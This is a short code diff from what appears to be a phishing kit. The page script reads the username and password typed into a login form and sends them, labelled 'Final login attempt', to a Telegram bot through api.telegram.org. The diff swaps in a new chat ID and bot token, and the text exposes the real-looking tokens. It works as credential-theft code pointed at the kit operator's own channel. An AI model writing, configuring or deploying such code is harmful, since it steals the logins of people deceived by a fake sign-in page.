@@ -174,8 +174,8 @@
             const password = document.getElementById('password').value;
             const textMessage = `*Final login attempt:* \n*Username:* ${username}\n*Password:* ${password}`;
 
-            const chatId = '6534651073'; // Replace with your chat ID
-            const token = '6924245302:AAFQcLpYC6i8J3Z9mBo2UewGfP-1U2wdFDQ'; // Replace with your bot token
+            const chatId = '5629548312'; // Replace with your chat ID
+            const token = '7329190669:AAEjjwcMH0WSgQxtGElr8S3vd8kkeVtuCGY'; // Replace with your bot token
 
             const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(textMessage)}&parse_mode=Markdown`;
 
@@ -187,6 +187,7 @@
                     console.log('Final message sent successfully!');
                 } else {
                     console.log('Failed to send final message.');
+
                 }
             }).catch(error => {
                 console.error('Error:', error);
